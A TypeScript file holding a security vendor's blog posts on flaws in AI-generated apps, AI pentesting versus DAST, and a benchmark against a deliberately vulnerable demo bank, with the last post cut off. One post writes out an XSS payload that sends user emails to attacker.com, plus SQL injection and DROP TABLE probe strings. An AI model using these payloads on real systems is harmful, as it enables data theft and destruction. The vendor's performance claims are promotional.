// Static blog post registry. Replace with MDX or a CMS once volume justifies it;
// this is intentionally bare so we ship the first posts in a day.

export interface BlogPost {
  slug: string;
  title: string;
  excerpt: string;
  date: string;
  readingTime: string;
  author: { name: string; role: string };
  tags: string[];
  body: string; // markdown
}

export const POSTS: BlogPost[] = [
  {
    slug: 'vibe-coded-app-security-risks',
    title: 'The 7 Security Holes Hidden in Vibe-Coded Apps (and Why Your AI-Built SaaS Probably Has Them)',
    excerpt:
      "Cursor will ship you a working app in an evening. It won't tell you about the SQL-injection-shaped hole in your login route. Here are the seven things AI-generated code quietly gets wrong about security — with the code patterns to grep for tonight.",
    date: '2026-05-12',
    readingTime: '11 min read',
    author: { name: 'The team', role: 'Founders' },
    tags: ['Security', 'Vibe Coding', 'OWASP'],
    body: `
If you shipped a SaaS this year with Cursor, v0, Lovable, Bolt, or Claude Code, your app probably works. That's the whole pitch of vibe coding: ship the working version this evening, not the spec next quarter.

Working isn't safe. Most LLM-generated backends still ship with the same handful of vulnerabilities — and because the code looks clean, you don't notice. The framework imports look correct. The error handling is structured. The variable names are good. And the login endpoint string-concatenates user input into a SQL query.

This is the post we wish we'd seen before we did the same thing.

We've spent the last six months pointing an AI security engineer at vibe-coded apps and known-vulnerable testbeds. The same patterns keep recurring. Here are the seven biggest ones, the exact code shapes to look for, and the question you can ask in five minutes to know whether your app has them.

This is the awareness piece — if you already know you have a problem and you're picking between scanners, jump to [AI penetration testing vs traditional DAST](/blog/ai-penetration-testing-vs-dast).

## What we mean by "vibe-coded" — and why the security model is different

"Vibe coding" is shorthand for the workflow where a human describes the desired behaviour and an AI writes (most of) the code. Cursor's tab-complete on steroids. v0 generating a React UI from a sketch. Lovable building a full stack from a prompt. Bolt scaffolding a backend in one shot.

The output runs. It's usually idiomatic. It often has tests. What's missing is the part a security-conscious senior would do reflexively: think adversarially about the inputs.

LLMs are trained on the public corpus of working code. That corpus is biased toward *tutorial* code — the kind that demonstrates a concept and skips the boilerplate. Most security defences are boilerplate. Parameterised queries are boilerplate. CSRF tokens are boilerplate. Row-level access checks are boilerplate. Tutorials skip them; LLMs learn to skip them too.

The seven holes below are what falls out of that bias.

## 1. SQL injection — the one almost everyone ships

The pattern. An LLM, asked to "fetch the user by email," will reliably produce:

\`\`\`ts
const result = await db.query(\`SELECT * FROM users WHERE email = '\${email}'\`);
\`\`\`

This looks plausible. It runs. It returns the right row in dev. It also lets anyone with a browser drop your database.

The fix is parameterised queries — every database driver in every language supports them, and LLMs will write them correctly *if you ask*. The problem is that they default to string interpolation because string interpolation is what's in the training corpus.

**What to grep for tonight:**

\`\`\`bash
# Anywhere a string-template-literal contains the word SELECT, INSERT, UPDATE, or DELETE
grep -rn -E '\`[^\`]*(SELECT|INSERT|UPDATE|DELETE)[^\`]*\$\{' src/
\`\`\`

Every hit is a candidate. Run an actual SQL-injection probe against your login and search endpoints — \`OR 1=1--\` on a username field, \`'; DROP TABLE users; --\` on a search box. If either one returns something unusual, you know.

We just published [the benchmark numbers](/blog/tensorshield-vs-altoro-mutual-benchmark) from running an AI scanner against IBM's vulnerable demo bank. Two of the three findings it surfaced were direct hits on injection-class bugs.

## 2. IDOR — "just trust the URL parameter"

IDOR (Insecure Direct Object Reference) is the bug where your endpoint trusts a path parameter without checking whether the calling user is allowed to access that resource.

The pattern:

\`\`\`ts
app.get('/api/orders/:id', requireAuth, async (req, res) => {
  const order = await db.orders.findById(req.params.id);
  res.json(order);
});
\`\`\`

Authenticated? Yes. Authorised? Nobody checked. Any logged-in user can change the URL from \`/api/orders/123\` to \`/api/orders/124\` and read someone else's order.

LLMs love this pattern because tutorials love this pattern. It's the cleanest possible REST handler and it's wrong.

The fix is one extra line:

\`\`\`ts
app.get('/api/orders/:id', requireAuth, async (req, res) => {
  const order = await db.orders.findById(req.params.id);
  if (order.userId !== req.user.id) return res.status(404).end();
  res.json(order);
});
\`\`\`

Or — much better — push it into the database with row-level security so the wrong user simply can't see the wrong row.

**The fastest IDOR test in the world:** log into your own app, find any URL with an ID in it, change the ID to a number you know belongs to someone else, hit enter. If you see data, you have a bug. We've seen this exact pattern at five-figure-revenue startups.

## 3. Hardcoded secrets — \`.env\` committed, JWT secrets in code

LLMs love placeholder values. \`process.env.JWT_SECRET || "your-secret-key"\` is a real line of real code in production apps right now. The fallback was for the LLM's example. It shipped.

Three patterns to look for:

- **Default fallbacks for secrets** — \`process.env.X || "literal-string"\`. The literal is your secret in any environment where the env var didn't get set. Which on first deploy is often *every* environment.
- **\`.env\` in git** — \`git log --all --full-history -- '*.env'\`. If anything comes back, your secrets are in your commit history forever even if you delete the file now. Rotate everything.
- **API keys in client-side code** — every \`process.env.NEXT_PUBLIC_*\` reference is shipped to the browser. If any of those are secrets (not just public anon keys), you've published them.

The trufflehog and gitleaks open-source scanners catch most of these. The harder version — secrets in Slack messages your AI assistant pasted into a chat that ended up in training data — needs an actual security review.

## 4. Authentication that's "auth-shaped"

The most common vibe-coded auth failure isn't *missing* auth. It's *broken* auth that looks right.

Concrete shapes:

- **JWT verification with \`algorithm: 'none'\` accepted.** The library default for years was to accept whatever \`alg\` field the token said. Specify the expected algorithm explicitly.
- **Password comparison via \`==\` instead of constant-time comparison.** Timing attacks are real. Use \`crypto.timingSafeEqual\` or bcrypt's built-in comparator.
- **Sessions without rotation on login.** Session-fixation: attacker plants a session cookie, victim logs in, attacker now has an authenticated session.
- **"Magic link" tokens that never expire.** One-time-use, short-TTL, single-purpose. Not the same token reusable forever.

These are subtle. They look correct in code review. They require either a security expert reading the code, or a tool that probes the running endpoint adversarially.

## 5. Cross-site scripting (XSS) — \`innerHTML\` and \`dangerouslySetInnerHTML\`

The React era killed off a lot of XSS by making string-to-DOM unsafe-by-default. Vibe coding is bringing it back because LLMs see \`dangerouslySetInnerHTML\` in their training corpus and use it whenever they need to render markdown, custom HTML, or styled error messages.

The pattern:

\`\`\`jsx
<div dangerouslySetInnerHTML={{ __html: userBio }} />
\`\`\`

\`userBio\` came from the database. The database got it from a form. The form didn't sanitise. Someone signs up with their bio set to \`<script>fetch('/api/me/email').then(r=>r.json()).then(d=>navigator.sendBeacon('https://attacker.com/log',d.email))</script>\` — and now every viewer's email is exfiltrated.

Fix: never set raw HTML. If you really must (rendering markdown the user typed), pipe it through DOMPurify first.

**Grep:** \`grep -rn 'dangerouslySetInnerHTML\\|innerHTML' src/\`. Every result is a candidate.

## 6. CSRF on state-changing endpoints

If your app is browser-first and uses cookies for auth, every state-changing endpoint needs CSRF protection. Vibe-coded backends routinely skip this because:

- The LLM doesn't know whether you're going to use cookies or Authorization headers
- Modern frameworks (Next.js Route Handlers, FastAPI, Express) don't enforce CSRF tokens by default
- The bug is invisible until someone actually exploits it

The textbook attack: attacker sets up a page with an autosubmitting \`<form action="https://yourapp.com/api/transfer" method="POST">\`. Victim visits while logged in. Their browser sends the cookie. Your app processes the transfer.

**Quick check:** is there a CSRF token (or SameSite=Strict cookie, or origin/referer check) on every POST/PUT/DELETE endpoint that does anything important? If you can't answer yes for every endpoint, you have a hole.

Modern fix: SameSite=Lax or Strict on session cookies stops most attacks; add explicit CSRF tokens for the bank-transfer-level operations.

## 7. Missing security headers — the free-ish wins you're skipping

The headers that nobody adds because the LLM didn't think to and you didn't notice:

| Header | What it does | Default if missing |
|---|---|---|
| \`Content-Security-Policy\` | Restricts which scripts/origins can run | Any script can run from any origin |
| \`X-Frame-Options: DENY\` | Stops your app being iframed | Clickjacking possible |
| \`Strict-Transport-Security\` | Forces HTTPS for repeat visitors | First-visit MITM possible |
| \`X-Content-Type-Options: nosniff\` | Stops MIME-type sniffing exploits | Polyglot file uploads exploitable |
| \`Referrer-Policy\` | Controls referrer header leakage | Full URL with tokens leaked to third parties |

These are usually one config block in Next.js' \`next.config.js\` or Express's helmet middleware. They take 5 minutes to add. They get caught by every off-the-shelf security scanner in the world and they will *definitely* appear in any SOC 2 vendor questionnaire your enterprise customers send.

Run [securityheaders.com](https://securityheaders.com) against your live URL. Anything below an A is a free fix.

## So what do you actually do about it?

Three honest options, in increasing order of cost and coverage.

**Option 1: do nothing.** Most vibe-coded apps in production right now have several of the holes above. Some of them never get exploited. Not because they aren't exploitable — because attackers go after high-value targets first and yours might not be on the list yet. This is a real strategy. It stops being one the day you take a payment, store PII, or sell to an enterprise that asks for a SOC 2.

**Option 2: run a free scanner.** Tools like [securityheaders.com](https://securityheaders.com), [Mozilla Observatory](https://observatory.mozilla.org/), and the free tier of [OWASP ZAP](https://www.zaproxy.org/) catch the cheap wins — headers, basic XSS, obvious SQL injection. They miss everything that requires context: IDOR, business-logic flaws, real authentication bypasses.

**Option 3: AI penetration testing.** A relatively new category — an AI agent that acts like a security engineer, probes your running app adversarially, and tells you what's exploitable rather than what's theoretically vulnerable. This is what we build. The trade-off vs traditional DAST is laid out in detail in our [AI pentesting vs DAST comparison](/blog/ai-penetration-testing-vs-dast); the receipts on what AI actually catches are in our [Altoro Mutual benchmark](/blog/tensorshield-vs-altoro-mutual-benchmark).

## FAQ

**Is vibe coding actually less secure than hand-written code?**

Not inherently. Vibe-coded code reflects what's in the training corpus. The training corpus skews toward tutorial code. Tutorial code skips security boilerplate. So vibe-coded apps tend to ship without the boilerplate. A senior engineer writing the same app by hand would (usually) add it back. A junior engineer writing the same app by hand often wouldn't either.

**Will the LLM fix these if I ask?**

Mostly yes. Modern LLMs will write parameterised queries, sanitised templates, and CSRF tokens correctly when explicitly prompted. The problem is the defaults — you have to know to ask.

**Do I need a SOC 2 just because I'm a vibe-coded SaaS?**

If your customers are individuals or other small businesses, probably not. If you want to sell to anyone with a security team, eventually yes. The SOC 2 vendor questionnaire will ask whether you've done a vulnerability scan and a penetration test in the last 12 months. Both have to be true to answer "yes."

**Which of the seven is the most dangerous?**

SQL injection on an unauthenticated endpoint, every time. It hands an attacker your entire database with no further work. Most of the others require some chaining or a logged-in victim.

**Can I just rely on AWS WAF / Cloudflare?**

A WAF is a fence, not a fix. It catches the *shapes* of common attacks — generic SQL injection payloads, generic XSS — but a competent attacker mutates the payload until it gets through. WAFs are real layered defence but they don't substitute for not having the bug.

## What to do this week

Five things you can do in 30 minutes total:

1. Grep for the SQL string-template pattern in §1. Fix anything that hits.
2. Run [securityheaders.com](https://securityheaders.com) against your live URL.
3. Try the IDOR test in §2 — log in, change an ID in a URL, see what happens.
4. \`git log --all --full-history -- '*.env'\` to check for committed secrets.
5. Sign up for a [free TensorShield scan](/signup) and get the running-target report. 5 scans, no card.

If anything in the first four turns up something real, the fifth one will find the rest.

— The team
`,
  },
  {
    slug: 'ai-penetration-testing-vs-dast',
    title: 'AI Penetration Testing vs Traditional DAST: A 2026 Founder\'s Decision Guide',
    excerpt:
      "DAST tools are 20 years old and built for enterprise security teams. AI penetration testing is new and built for founders who don't have one. Here's where each one wins, where they tie, and the questions to ask before you buy.",
    date: '2026-05-12',
    readingTime: '9 min read',
    author: { name: 'The team', role: 'Founders' },
    tags: ['Security', 'Tools', 'Comparison'],
    body: `
If you've just realised your [vibe-coded app has security holes](/blog/vibe-coded-app-security-risks), the next question is what to do about it — and the market has two answers in 2026.

The old answer is **DAST** — Dynamic Application Security Testing. The category has existed since the early 2000s. Acunetix, Veracode, Burp Suite, Netsparker (now Invicti), OWASP ZAP. These tools fuzz your app's endpoints with known attack payloads and report what matches a signature.

The new answer is **AI penetration testing** — an LLM-powered agent that reasons about your app the way a human security engineer would, then probes it adversarially. TensorShield, PentestGPT, a half-dozen recent entrants. The category didn't exist three years ago.

This is the founder-level decision guide. If you're evaluating which to buy (or whether to buy both), here's the actual trade-off, with no marketing on either side.

## The 30-second version

| | Traditional DAST | AI penetration testing |
|---|---|---|
| Best at | Well-known vulnerability classes, repeatability, compliance check-boxes | Business logic flaws, novel chains, low-FP triage, vibe-coded apps |
| Worst at | False positives, anything novel, business logic, JavaScript-heavy SPAs | Repeatability run-over-run, deep coverage of well-trodden classes |
| Cost (annual) | $5k–$50k+ | $0–$500 for small apps; ~$2–$10/scan |
| Time per scan | Hours to overnight | 5–30 minutes |
| Learning curve | Steep (security background helpful) | Low (describe the app, hit go) |
| SOC 2 evidence | Mature, accepted | Accepted, often needs explanation |
| When it shines | Continuous CI gate on a mature codebase | One-shot pre-launch checks; novel business logic |

The honest answer is **most early-stage founders should start with AI penetration testing**. Most security teams at companies past 50 people should run both. We'll explain why.

## Where traditional DAST wins

Traditional DAST is mature. Twenty years of signature engineering, payload corpora, and false-positive tuning. For the things it covers well, it is genuinely excellent.

**It wins on the OWASP Top 10 classics.** SQL injection, reflected XSS, command injection, classic file inclusion, basic authentication weaknesses. The signature library has seen ten thousand variations of these and a modern DAST will catch them with high recall.

**It wins on repeatability.** Run the same scan on the same target two weeks apart and you get the same findings (modulo target changes). This matters for compliance reports, regression testing, and CI gating.

**It wins on coverage breadth.** A mature DAST will probe every endpoint, every form field, every header, every cookie. The brute-force approach is its strength. An AI agent decides what's worth probing; a DAST probes everything.

**It wins on enterprise auditor acceptance.** SOC 2 auditors have been seeing Burp Suite and Veracode reports for fifteen years. They know what they look like. An AI scanner's report is newer territory — accepted, but sometimes requires a paragraph of context.

If your stack is mature, the codebase is large, and you already have a security engineer to triage the output, DAST is the right floor.

## Where AI penetration testing wins

AI penetration testing is built for a different problem: the *novel* and the *contextual*.

**It wins on business-logic flaws.** Signature-based scanners cannot reason about "the transfer endpoint accepts negative amounts" because there's no signature for that — the request is well-formed, the response is HTTP 200, every check passes. We surfaced this exact bug on IBM's Altoro Mutual demo in our [recent benchmark](/blog/tensorshield-vs-altoro-mutual-benchmark) — the canonical curated answer key didn't even include it as a known vulnerability. AI agents reason about *intent*; DAST reasons about *patterns*.

**It wins on false-positive rate, *if* triage is built in.** A bare AI scanner without a triage layer is the noisiest tool in the world (it'll happily flag every suspicious-looking thing in the response). With a second-pass triage model that asks "is this reachable, exploitable, real?" the false-positive rate gets dramatically below DAST's. Our [how reinforcement-trained triage actually works](/blog/ai-triage-explained) post walks through the rubric.

**It wins on cost.** A modern AI agent against a small SaaS costs $0.50 to $10 per scan in LLM bills. Annual licences for enterprise DAST tools run from $5,000 (Burp Suite Pro, single seat) to $50,000+ (Veracode, Invicti). For early-stage teams, AI pentesting is the only thing in budget.

**It wins on vibe-coded apps specifically.** SPAs, JAMstack, AI-generated UIs — the apps where everything happens in JavaScript and the surface map isn't a simple endpoint list. DAST tools have been improving here but it's hard. An AI agent that drives a real browser (which is how modern AI pentesting tools work) handles JS-heavy apps the same way a human would.

**It wins on time-to-first-finding.** First scan in five to thirty minutes. DAST scans can take overnight for a real codebase.

## Where they tie (or both lose)

Some categories neither tool fully solves on its own.

**CSRF and missing-header findings** — both tools catch these reliably. Both tools also miss the same edge cases (custom auth tokens, partial CSRF mitigation).

**Authenticated scans** — both struggle with apps that have non-trivial auth flows (MFA, OAuth, magic links). Both tools support authenticated scanning if you give them a session cookie or test credentials. Neither handles complex flows seamlessly.

**Source code analysis (SAST)** — neither category covers this. SAST is a separate market. The good news: most modern AI pentesting tools (ours included) layer a SAST engine in for code-target scans.

**Compliance evidence freshness** — both produce attestable reports. The difference is in *what* the report says, not whether it's accepted.

## A real example: the Altoro Mutual benchmark

We point our AI security engineer at [IBM's Altoro Mutual](https://demo.testfire.net) — a public, intentionally-vulnerable banking demo that's been the canonical DAST benchmark target since 2008. The curated ground-truth list has 15 known vulnerabilities.

Our scan: 25 minutes, $1.36 in LLM cost, 3 findings:

| Finding | Match against curated list | Type a DAST would catch? |
|---|---|---|
| Reflected XSS in search query parameter | Direct hit | Yes — classic DAST territory |
| IDOR in account/transaction APIs | Direct hit (CWE-639) | Sometimes — depends on tool's auth handling |
| **Business Logic Flaw: Negative Amount Transfer** | **Not in the curated list** | **No** — no DAST signature for this |

The third finding is the interesting one. The curated answer key didn't list it. We confirmed it's a real, documented Altoro vulnerability — just one the original list missed. *Signature-based DAST cannot find this class of bug.* Our scanner reasoned about transfer semantics and tried a negative number.

Recall (against the 15-item list): 13%. Not great in absolute terms. But the **2 it caught are real bugs** and the **1 "extra" is also real**. And the cost was $1.36. Read the full receipts in the [Altoro benchmark post](/blog/tensorshield-vs-altoro-mutual-benchmark) — including the 13 we didn't catch and why.

## The cost math nobody publishes

Here's roughly what we see in actual founder pricing in 2026:

**Traditional DAST**

- Burp Suite Pro: $475/yr per seat (manual operation, not automated CI)
- Acunetix: $4,500+/yr for the smallest license
- Veracode / Invicti / Checkmarx: $25,000–$100,000+/yr with onboarding
- OWASP ZAP: free, requires significant operator skill
- A retained pentest firm: $5,000–$30,000 per engagement, once or twice a year

**AI penetration testing**

- TensorShield: free tier (5 scans, no card), then ~$2–$10 per scan
- Other emerging vendors: similar shape, $0–$500/mo tiers
- Pay-as-you-go LLM cost models — your spend scales with usage, not with seat count

For a pre-seed founder who needs to answer "yes" to the SOC 2 vulnerability-scan question and has *one* engineer to triage the output, the cost gap is the entire decision.

For a Series B company with a security team and an enterprise customer asking specific questions about MASVS coverage, the budget difference becomes irrelevant and the question shifts to "which tool gives my team the right output to act on" — and the answer is often *both*.

## The decision tree

Five questions, ranked by how much they should drive your choice:

1. **Do you have a dedicated security engineer to triage output?**
   - No → AI penetration testing (lower FP rate is non-negotiable)
   - Yes → either works, lean DAST for breadth + AI for novel bugs

2. **What's your annual security budget?**
   - Under $5k → AI penetration testing
   - $5k–$25k → AI for daily / weekly, retain a human pentest yearly
   - $25k+ → run both, treat them as complementary

3. **What's your stack?**
   - Vibe-coded SPA or AI-generated backend → AI penetration testing first
   - Traditional MVC / well-trodden patterns → DAST will perform well

4. **What's the compliance audience?**
   - SOC 2 Type I → either is fine for the vuln-scan control
   - SOC 2 Type II with technical auditor → AI report may need narrative; DAST report is more familiar
   - PCI / HITRUST / FedRAMP → talk to your auditor first, both are accepted but the ASV requirements are specific

5. **How often are you shipping?**
   - Continuous (multiple PRs per day) → AI penetration testing, every PR or daily
   - Weekly / monthly → DAST in CI, AI for novel features

## FAQ

**Does AI penetration testing replace a human pentest?**

For SOC 2 vulnerability-scan controls, mostly yes. For penetration-test controls specifically (the human kind), not yet — most auditors still want a human report with the year. The good news is the human pentester can use AI tools as part of their methodology, which is increasingly common.

**Is AI pentesting safe to run against production?**

Same caveats as any DAST. The agent issues real HTTP requests. We default to "find, don't exploit" — the scanner verifies vulnerability classes without actually exfiltrating data or modifying state — but you should always have a staging environment first.

**What about false positives in AI-generated findings?**

AI scanners *without* a triage layer are noisier than DAST. AI scanners *with* a reinforcement-trained triage layer are usually quieter than DAST. The triage layer is the whole product, not an add-on — make sure whoever you evaluate has one.

**Can I just use OWASP ZAP for free?**

You can, and we recommend it as a baseline. ZAP is a real DAST. It needs some operator skill, it's noisier than commercial tools, and it has a learning curve. If you have time, run it alongside an AI scanner — the overlap is informative.

## What to try next

If you want to see what each one produces on a real target without spending money:

- AI penetration testing: the [TensorShield free tier](/signup) — 5 scans, no card, full triage layer.
- Traditional DAST: [OWASP ZAP](https://www.zaproxy.org/) is free and good.

Point both at [demo.testfire.net](https://demo.testfire.net) — that's the testbed our [benchmark post](/blog/tensorshield-vs-altoro-mutual-benchmark) uses, so you can compare what each one finds against our published numbers and the curated ground-truth list.

— The team
`,
  },
  {
    slug: 'tensorshield-vs-altoro-mutual-benchmark',
    title: '$1.36 of AI Found Real Vulnerabilities in IBM\'s Demo Bank. Here\'s What It Did (and Didn\'t) Catch.',
    excerpt:
      "We pointed our AI security engineer at IBM's public vulnerable banking demo for 25 minutes. It cost $1.36 and surfaced 3 real findings — including one the curated answer key missed. We're publishing the full receipts, including the 13 it didn't catch.",
    date: '2026-05-12',
    readingTime: '8 min read',
    author: { name: 'The team', role: 'Founders' },
    tags: ['Benchmarks', 'Engineering', 'Transparency'],
    body: `
The AI-security category has a credibility problem. Every vendor demos against their own examples, claims 95% recall, and ships zero numbers against industry-standard testbeds.

We're going the other way. This is the receipts post.

We pointed our scanner at [IBM's Altoro Mutual](https://demo.testfire.net) — a public, intentionally-vulnerable banking demo that's been the standard DAST benchmark target since 2008. 15 publicly-documented vulnerabilities. \`gemini-2.5-flash\` as the reasoning model. \`standard\` scan mode. \$2.50 cost cap.

**Result: 3 findings, 2 direct ground-truth matches, 1 real extra the curated list didn't include. 25 minutes wall-clock. $1.36 in LLM cost. 67% precision, 13% recall, 22% F1.**

If you're evaluating AI penetration testing, this is the post that should tell you whether to keep evaluating us. We're publishing what we caught, what we missed, and why we missed it.

## Why Altoro Mutual

Altoro Mutual is a fake bank IBM/HCL has hosted for over 15 years specifically so security tools can be benchmarked against a target with known answers. SQLi at the login form, XSS in the search box, an LFI via the \`content=\` parameter, default credentials (\`admin/admin\`), missing security headers, an exposed \`/comment.txt\` and \`/robots.txt\`, CSRF on the transfer endpoint. 15 issues total, all publicly documented.

Most DAST benchmarks publish numbers against Altoro. Most AI security tools don't. We're starting there.

## What we ran

\`\`\`bash
# Engine: ClatTribe/strix HEAD (post-PR-#225 sandbox fix)
# Sandbox image: strix-sandbox:fork-latest
# LLM: gemini/gemini-2.5-flash via litellm
# Mode: standard (~15 min / <$2.50 budget)

STRIX_LLM=gemini/gemini-2.5-flash \\
STRIX_IMAGE=strix-sandbox:fork-latest \\
  strix -n -t https://demo.testfire.net -m standard --max-cost 2.50
\`\`\`

End-to-end through the TensorShield wrapper — scan creation via the atomic \`create_scan_with_targets\` RPC, worker daemon picks up the \`pg_notify('scan_queued')\`, events stream into Supabase as they fire, findings land in the UI.

## What it caught

| Severity | Title | Endpoint | Ground-truth match |
|---|---|---|---|
| medium | Reflected XSS in Search Query Parameter | — | ✓ \`altoro-xss-reflected\` |
| medium | IDOR in Account / Transaction APIs | \`/api/account/{accountNo}\` | ✓ \`altoro-param-tampering\` (CWE-639) |
| high | **Business Logic Flaw: Negative Amount Transfer** | \`/api/transfer\` | **Extra** — not in our curated list |

The third finding is the interesting one. Our curated 15-item ground-truth doesn't include "transfer endpoint accepts negative amounts" as a known Altoro vulnerability — even though it's a real, documented issue with the application. Strict scoring counts it against precision (we count anything not in the answer key as a potential false positive). In practice, it's a third true positive.

We could have quietly added it to the ground truth before publishing the benchmark and shown 100% precision. We didn't, because the rule is the rule and changing it after seeing the result is the bad version. Ground-truth refresh is queued as a separate PR — it'll change next quarter's numbers, not this one's.

This is exactly the case [signature-based DAST cannot find](/blog/ai-penetration-testing-vs-dast). The HTTP request is well-formed. The response is HTTP 200. Every signature passes. You have to reason about transfer semantics — "negative amounts shouldn't move money the wrong way" — and try one. The AI did.

## What it missed

13 of 15. Honest list:

- SQLi at \`/bank/login.aspx\`
- SQLi at \`/search.aspx\`
- Stored XSS in the feedback form
- LFI via \`?content=\` parameter
- Default credentials (\`admin/admin\`)
- Missing \`X-Frame-Options\`
- Missing \`Content-Security-Policy\`
- HTTP TRACE method enabled
- Info disclosure at \`/comment.txt\`
- Info disclosure at \`/robots.txt\` (sensitive paths)
- Server banner disclosure
- CSRF on the money-transfer endpoint
- Plaintext HTTP for banking operations

These are all things a mature DAST scanner would catch — and that our scanner *should* catch. The reason it didn't: the lead agent dispatched 5 specialists out of an expected ~10. Our hypothesis is that \`gemini-2.5-flash\` (the cost-optimal default) reasons less aggressively about specialist dispatch than \`gemini-2.5-pro\` would. We're running the same scan with Pro to compare — that'll be a follow-up post.

This is what "13% recall" actually means and why we're publishing it instead of hiding it.

## How we got here

Three attempts to get the first non-zero number. Each surfaced a real bug that's now fixed.

| Run | Engine | Sandbox bug | Cost | Findings | Recall |
|---|---|---|---:|---:|---:|
| 1 | \`3b48809\` | none (pre-fix) | $2.61 | 0 | 0% |
| 2 | \`4f3f93c\` | \`strix.sca\` missing | $0.10 | 0 | 0% |
| 3 | \`4f3f93c\` + 1-line patch | \`strix.threat_intel\` missing | $0.09 | 0 | 0% |
| **4** | **\`4f3f93c\` + wholesale fix** | **none** | **$1.36** | **3** | **13%** |

Run 1 was the [emission-starvation incident](https://github.com/ClatTribe/strix/blob/main/docs/incidents/2026-05-06-finding-emission-starvation.md) — the agent found evidence of bugs but never converted them into structured emissions before the budget cap fired. Fixed upstream as strix#147.

Runs 2 and 3 were a much more subtle bug, and the reason this post exists. Both ran for under 90 seconds, exited cleanly with \`scan_completed: true\` and 0 findings. From the surface, it looked like the model had decided the run was done. The metric was misleading us.

What was actually happening: every single tool call inside the sandbox returned \`Sandbox execution error: Tool execution error: No module named 'strix.sca'\`. The Docker image was cherry-picking subdirs of the engine's Python package into the sandbox container. As the engine grew (Phase 6 added \`strix/sca/\`, Phase 9 added \`strix/threat_intel/\`, etc.), each new subdir silently broke the sandbox because the Dockerfile wasn't updated.

The fix (filed upstream as ClatTribe/strix#225) was to copy the whole package wholesale instead of cherry-picking. The full debugging walk-through is in our [benchmark archive](https://github.com/ClatTribe/webappsec/blob/main/BENCHMARKS.md) — including how reading \`events.jsonl\` line-by-line is what surfaced the actual error.

This is what an end-to-end benchmark is *for*: surfacing the bug that wouldn't have been caught by unit tests, because the tests run from source and the sandbox image runs from a different source tree.

## What the numbers mean

Three things worth saying out loud.

**1. 13% recall is not great in absolute terms.** A mature commercial DAST scanner against Altoro would get 60–80% recall. We're not at parity. We're publishing the number because it's the truth and because the trajectory is what matters — last benchmark we ran was 0%.

**2. The 67% precision is honest, but understated.** The "extra" — the negative-amount transfer — is a real Altoro bug we found that our own curated list missed. Real-world precision is 3/3 (100%), with the strict-rule precision being 2/3 (67%). We report the strict number to keep ourselves honest on future runs.

**3. The cost is the headline.** $1.36 for a 25-minute end-to-end scan. Most commercial DAST tools start at $5,000/year. The cost gap is the entire reason this category exists. Even if we never close the recall gap to DAST parity (and we will), the cost gap funds a lot of "run it again with different reasoning" trials.

## What's next

The follow-ups, in order:

1. **Re-run with \`gemini-2.5-pro\`** as the reasoning model to test the lead-dispatch hypothesis. Pro reasons more thoroughly; if recall jumps to 40%+, we know the bottleneck is model selection.
2. **Re-run with \`-m deep\`** instead of \`standard\` to give the lead more budget for specialist coverage.
3. **Refresh the ground-truth list** to include the negative-amount-transfer flaw (next quarter's numbers, not this one's).
4. **Add Juice Shop, DVWA, NodeGoat, testphp-vulnweb** to the benchmark suite. Total ground-truth across all five: 55 known vulnerabilities.

All numbers go into [BENCHMARKS.md](https://github.com/ClatTribe/webappsec/blob/main/BENCHMARKS.md) in the open. We publish the bad runs too.

## FAQ

**Why are you publishing your own bad number?**

Because the alternative is the marketing-noise that already exists. Vendors who only publish good runs are useless — there's no signal in their numbers. Vendors who publish all runs are the only ones whose claims are checkable.

**Is 13% recall actually usable?**

Depends on the alternative. For a founder who currently runs zero scans because they can't afford a $25k DAST license: yes, 3 real findings for $1.36 is the right floor. For a Series B with a security team that already runs Burp Suite weekly: not yet — run both.

**What happens to the 13 you missed in production?**

In our product, the scan would have completed at exit code 3 (budget exceeded) on a deeper mode. The wrapper would surface "coverage incomplete, 6 categories not fully probed" in the UI — explicit on the gap rather than hiding it. The user knows what was and wasn't checked.

**Can I reproduce this benchmark?**

Yes. The full reproduction recipe is in [BENCHMARKS.md](https://github.com/ClatTribe/webappsec/blob/main/BENCHMARKS.md) — engine commit, Docker image build, scan creation SQL, scoring CLI. Re-run it on your machine and compare against our published numbers.

**Where do I learn more about AI pentesting in general?**

Start with our [AI penetration testing vs DAST comparison](/blog/ai-penetration-testing-vs-dast). If you're earlier in the funnel, the [vibe-coded app security risks post](/blog/vibe-coded-app-security-risks) covers the underlying problem.

## Try it

If you want the same scan against your own target — your real app, not a testbed — the [free tier](/signup) gives you 5 scans with no card. The report you'll see is the same format as the one this post is based on, with the triage layer (Urgent / Soon / Monitor / Dismiss) layered on top so the numbers above are sharper for your codebase than they are against a 15-year-old demo bank.

— The team
`,
  },
  {
    slug: 'why-we-built-this',
    title: 'Why we built another AI security product',
    excerpt:
      "There's no shortage of \"AI-powered\" security scanners. We didn't build one because the world needed more findings — we built one that learns from your triage so the noise dies.",
    date: '2026-04-28',
    readingTime: '5 min read',
    author: { name: 'The team', role: 'Founders' },
    tags: ['Product'],
    body: `
Walk into any security RSA Innovation Sandbox and you'll count thirty companies pitching "AI-powered" scanners. We're aware. We didn't build a thirty-first because the world needs more findings — we built one because the world needs **fewer false positives**.

## The thing that's actually broken

Take the most successful SAST tool of the last decade. Run it on a typical 200-kloc codebase. You get 300 findings. Of those, maybe 15 are real. The other 285 are theoretical: a SQL-injection pattern in a code path that's never reached from the internet, a hardcoded credential in an example file, a CVE in a transitive dev dependency that doesn't ship to production.

The tool isn't wrong. It's just optimizing for the wrong thing. Every static analyzer is built around a corporate buyer's question: *"will this catch the bug that ends up in the news?"*. The buyer needs to be able to say yes. So tools optimize for recall — find every theoretical issue — at the expense of precision.

The actual user, the developer or appsec engineer who has to triage the output, gets the worst experience in the industry. They drown in noise, learn to ignore the tool, and the next time something matters they don't notice.

## The two bets

**Bet one: agents that exploit, not agents that pattern-match.** A senior security engineer reading code can usually tell whether a finding is reachable. They look at the call graph, they trace the input, they think about the threat model. That's expensive — you can't pay them per finding. But the same workflow done by an AI agent, with the right tools (terminal, browser, file edits, an actual HTTP client), is now within reach. We build that.

**Bet two: the triage gets sharper with use.** Even an attacking agent will produce noise. The fix is a second model that reads the finding, the codebase context, and the deployment surface, and decides: *is this reachable? is it exploitable? is it a false positive?* Most "AI security" vendors stop here. We don't.

The differentiator is what happens after the user triages. Mark a finding fixed and the model gets a positive signal — that pattern, in your codebase, was a real bug. Mark it a false positive and the next time your scanner produces something similar, the triage layer catches it before it ever shows up in your inbox. Reinforcement learning, but for finding-ranking instead of dialogue. Your private model gets sharper week over week. Other customers' models don't see your data.

The result, on real customer codebases: false-positive rate drops from ~7% in the first week to under 1% by week four. The findings that surface are the ones worth your time. The rest get auto-dismissed.

## What we don't do

A few things we deliberately avoid that other "AI security" tools do:

